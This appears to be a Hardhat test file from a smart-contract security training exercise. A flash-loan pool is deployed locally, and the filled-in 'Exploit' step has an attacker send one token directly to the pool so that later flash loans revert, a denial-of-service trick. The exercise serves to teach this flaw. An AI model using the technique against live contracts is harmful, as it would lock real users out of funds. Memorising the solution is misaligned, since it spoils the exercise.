const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('DOS Exercise 3', function () {

    let deployer, user, attacker;

    const INITIAL_SUPPLY = ethers.utils.parseEther('1000000'); // 1 Million
    const TOKENS_IN_POOL = ethers.utils.parseEther('100000'); // 100K
    const ATTACKER_TOKENS = ethers.utils.parseEther('10'); // 10
    
    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user, attacker] = await ethers.getSigners();
        
        // Deploy contracts
        const ShibaTokenFactory = await ethers.getContractFactory(
            'contracts/dos-3/ShibaToken.sol:ShibaToken',
            deployer
        );
        this.token = await ShibaTokenFactory.deploy(INITIAL_SUPPLY);
        const ShibaPoolFactory = await ethers.getContractFactory(
            'contracts/dos-3/ShibaPool.sol:ShibaPool',
            deployer
        );
        this.pool = await ShibaPoolFactory.deploy(this.token.address);

        // Send tokens 
        await this.token.transfer(attacker.address, ATTACKER_TOKENS);
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL)
        
        // Balances Check
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(ATTACKER_TOKENS);

        // FlashLoan Check
        const FlashLoanUserFactory = await ethers.getContractFactory(
            'contracts/dos-3/FlashLoanUser.sol:FlashLoanUser',
            user
        );
        this.userContract = await FlashLoanUserFactory.deploy(this.pool.address);
        await this.userContract.requestFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('1'));
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        await expect(
            this.userContract.requestFlashLoan(10)
        ).to.be.reverted;
    });
});
